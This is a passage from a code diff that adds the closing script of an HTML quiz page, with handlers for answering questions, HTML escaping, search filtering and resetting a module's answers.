+      const id = key(activeModule, questionIndex);
+      if (answers[id]) return;
+      answers[id] = { selected: optionIndex, correct: optionIndex === item.answer };
+      saveState();
+      renderQuestions();
+      updateStats();
+    }
+
+    function escapeHTML(str) {
+      return String(str)
+        .replaceAll('&', '&amp;')
+        .replaceAll('<', '&lt;')
+        .replaceAll('>', '&gt;')
+        .replaceAll('"', '&quot;')
+        .replaceAll("'", '&#039;');
+    }
+
+    searchEl.addEventListener('input', (event) => {
+      query = event.target.value;
+      renderQuestions();
+    });
+
+    resetEl.addEventListener('click', () => {
+      if (!confirm('Reset all answers in this unit module?')) return;
+      modules[moduleNames[activeModule]].forEach((_, i) => delete answers[key(activeModule, i)]);
+      saveState();
+      renderQuestions();
+      updateStats();
+    });
+
+    render();
+  </script>
+</body>
+</html>
